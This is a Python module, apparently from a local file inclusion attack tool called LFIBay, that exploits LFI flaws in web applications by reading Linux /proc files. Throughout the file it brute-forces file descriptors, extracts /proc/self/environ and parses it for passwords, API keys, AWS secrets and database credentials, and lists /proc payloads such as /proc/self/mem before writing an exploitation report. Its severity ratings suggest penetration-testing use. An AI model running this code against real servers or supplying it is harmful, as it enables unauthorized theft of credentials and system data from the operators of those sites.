"""
LFIBay - /proc/ Filesystem Exploitation Module
Linux /proc/ filesystem exploitation for sensitive information disclosure
"""

import requests
import re


def brute_force_fd(base_url, start=0, end=50, cookies=None):
    """
    Brute force file descriptors (0-255)
    Args:
        base_url: URL with LFI parameter (use INJECT placeholder)
        start: Starting FD number
        end: Ending FD number
        cookies: Session cookies
    Returns: List of accessible file descriptors
    """
    accessible_fds = []
    
    for fd_num in range(start, end + 1):
        try:
            payload = f'/proc/self/fd/{fd_num}'
            test_url = base_url.replace('INJECT', payload)
            
            response = requests.get(test_url, cookies=cookies, timeout=5)
            
            # Check if FD is accessible and contains interesting data
            if response.status_code == 200 and len(response.text) > 0:
                # Look for interesting content
                content = response.text
                
                accessible_fds.append({
                    'fd': fd_num,
                    'path': payload,
                    'size': len(content),
                    'preview': content[:200],
                    'interesting': is_interesting_content(content)
                })
                
        except:
            continue
    
    return accessible_fds


def extract_environ(base_url, cookies=None):
    """
    Extract environment variables from /proc/self/environ
    Args:
        base_url: URL with LFI parameter (use INJECT placeholder)
        cookies: Session cookies
    Returns: Dictionary with environment variables
    """
    try:
        payload = '/proc/self/environ'
        test_url = base_url.replace('INJECT', payload)
        
        response = requests.get(test_url, cookies=cookies, timeout=10)
        
        if response.status_code == 200:
            # Environment variables are null-byte separated
            content = response.text
            
            # Parse environment variables
            env_vars = {}
            for line in content.split('\x00'):
                if '=' in line:
                    key, value = line.split('=', 1)
                    env_vars[key] = value
            
            return {
                'success': True,
                'path': payload,
                'env_vars': env_vars,
                'sensitive_found': detect_sensitive_env_vars(env_vars),
                'raw_content': content[:500]
            }
    except Exception as e:
        return {
            'success': False,
            'error': str(e)
        }
    
    return {'success': False}


def test_proc_paths(base_url,cookies=None):
    """
    Test common /proc paths (cmdline, maps, status)
    Args:
        base_url: URL with LFI parameter (use INJECT placeholder)
        cookies: Session cookies
    Returns: Dictionary with accessible paths and content
    """
    proc_paths = [
        '/proc/self/cmdline',
        '/proc/self/status',
        '/proc/self/maps',
        '/proc/self/environ',
        '/proc/version',
        '/proc/cpuinfo',
        '/proc/meminfo',
        '/proc/net/tcp',
        '/proc/net/fib_trie',
        '/proc/self/cwd',
    ]
    
    results = {
        'accessible_paths': [],
        'total_tested': len(proc_paths)
    }
    
    for proc_path in proc_paths:
        try:
            test_url = base_url.replace('INJECT', proc_path)
            response = requests.get(test_url, cookies=cookies, timeout=5)
            
            if response.status_code == 200 and len(response.text) > 0:
                content = response.text
                
                results['accessible_paths'].append({
                    'path': proc_path,
                    'size': len(content),
                    'content_preview': content[:300],
                    'sensitive_data': detect_sensitive_data(content)
                })
                
        except:
            continue
    
    return results


def detect_sensitive_data(content):
    """
    Detect sensitive information in /proc content
    Args:
        content: Content string
    Returns: List of detected sensitive patterns
    """
    sensitive_patterns = {
        'password': r'(password|passwd|pwd)[\s:=]+[\w\d]+',
        'api_key': r'(api[_-]?key|apikey)[\s:=]+[\w\d\-]+',
        'secret': r'(secret|token)[\s:=]+[\w\d\-]+',
        'database': r'(mysql|postgres|mongodb).*',
        'path': r'/[a-z]+/[a-z/]+',
        'ip_address': r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}',
        'email': r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}',
    }
    
    found = []
    
    for pattern_name, pattern in sensitive_patterns.items():
        matches = re.findall(pattern, content, re.IGNORECASE)
        if matches:
            found.append({
                'type': pattern_name,
                'count': len(matches),
                'examples': matches[:3]  # First 3 matches
            })
    
    return found


def detect_sensitive_env_vars(env_vars):
    """
    Detect sensitive environment variables
    Args:
        env_vars: Dictionary of environment variables
    Returns: List of sensitive variables found
    """
    sensitive_keys = [
        'PASSWORD', 'PASSWD', 'PWD', 'API_KEY', 'APIKEY',
        'SECRET', 'TOKEN', 'DATABASE_URL', 'DB_PASSWORD',
        'MYSQL_PASSWORD', 'POSTGRES_PASSWORD', 'REDIS_PASSWORD',
        'AWS_SECRET', 'AWS_ACCESS_KEY', 'PRIVATE_KEY'
    ]
    
    found = []
    
    for key, value in env_vars.items():
        for sensitive_key in sensitive_keys:
            if sensitive_key.lower() in key.lower():
                found.append({
                    'key': key,
                    'value': value[:50] + '...' if len(value) > 50 else value,
                    'type': 'credential'
                })
    
    return found


def is_interesting_content(content):
    """
    Determine if content is interesting/useful
    Args:
        content: Content string
    Returns: Boolean
    """
    interesting_indicators = [
        'root:', 'admin', 'password', 'secret', 'key',
        'config', 'database', '/etc/', '/var/', 'http',
        'mysql', 'postgres', 'api', '<?php'
    ]
    
    content_lower = content.lower()
    
    for indicator in interesting_indicators:
        if indicator in content_lower:
            return True
    
    return False


def get_proc_payloads():
    """
    Get list of all /proc/ related payloads
    Returns: List of /proc paths
    """
    payloads = []
    
    # File descriptors (0-50)
    for i in range(51):
        payloads.append(f'/proc/self/fd/{i}')
    
    # Common /proc paths
    common_paths = [
        '/proc/self/environ',
        '/proc/self/cmdline',
        '/proc/self/status',
        '/proc/self/stat',
        '/proc/self/maps',
        '/proc/self/mem',
        '/proc/self/cwd',
        '/proc/self/exe',
        '/proc/self/root',
        '/proc/self/mountinfo',
        '/proc/self/mounts',
        '/proc/version',
        '/proc/cpuinfo',
        '/proc/meminfo',
        '/proc/devices',
        '/proc/filesystems',
        '/proc/modules',
        '/proc/mounts',
        '/proc/swaps',
        '/proc/partitions',
        '/proc/net/tcp',
        '/proc/net/udp',
        '/proc/net/fib_trie',
        '/proc/net/route',
        '/proc/net/arp',
    ]
    
    payloads.extend(common_paths)
    
    # Alternative PID references
    for pid in [1, 1000]:
        payloads.append(f'/proc/{pid}/environ')
        payloads.append(f'/proc/{pid}/cmdline')
    
    return payloads


def analyze_proc_findings(findings):
    """
    Analyze /proc findings for security impact
    Args:
        findings: List of findings from /proc exploitation
    Returns: Dictionary with analysis
    """
    analysis = {
        'total_findings': len(findings),
        'high_severity': [],
        'medium_severity': [],
        'low_severity': [],
        'recommendations': []
    }
    
    for finding in findings:
        if 'sensitive_data' in finding and finding['sensitive_data']:
            # Check for credentials
            has_credentials = any(
                item['type'] in ['password', 'api_key', 'secret']
                for item in finding['sensitive_data']
            )
            
            if has_credentials:
                analysis['high_severity'].append(finding)
                analysis['recommendations'].append(
                    f"High risk: Credentials found in {finding['path']}"
                )
            elif 'environ' in finding['path']:
                analysis['medium_severity'].append(finding)
                analysis['recommendations'].append(
                    f"Medium risk: Environment variables exposed at {finding['path']}"
                )
            else:
                analysis['low_severity'].append(finding)
        else:
            analysis['low_severity'].append(finding)
    
    return analysis


def create_proc_report(findings):
    """
    Create human-readable report of /proc findings
    Args:
        findings: List of findings
    Returns: String report
    """
    report = []
    report.append("=" * 60)
    report.append("/proc/ EXPLOITATION REPORT")
    report.append("=" * 60)
    report.append(f"\nTotal Findings: {len(findings)}\n")
    
    analysis = analyze_proc_findings(findings)
    
    if analysis['high_severity']:
        report.append(f"\nðŸ”´ HIGH SEVERITY ({len(analysis['high_severity'])})")
        for finding in analysis['high_severity']:
            report.append(f"  - {finding['path']}")
            if 'sensitive_data' in finding:
                for item in finding['sensitive_data']:
                    report.append(f"    â†’ {item['type']}: {item['count']} matches")
    
    if analysis['medium_severity']:
        report.append(f"\nðŸŸ¡ MEDIUM SEVERITY ({len(analysis['medium_severity'])})")
        for finding in analysis['medium_severity']:
            report.append(f"  - {finding['path']}")
    
    if analysis['low_severity']:
        report.append(f"\nðŸŸ¢ LOW SEVERITY ({len(analysis['low_severity'])})")
        report.append(f"  {len(analysis['low_severity'])} informational findings")
    
    if analysis['recommendations']:
        report.append("\nðŸ“‹ RECOMMENDATIONS:")
        for rec in analysis['recommendations']:
            report.append(f"  â€¢ {rec}")
    
    report.append("\n" + "=" * 60)
    
    return "\n".join(report)
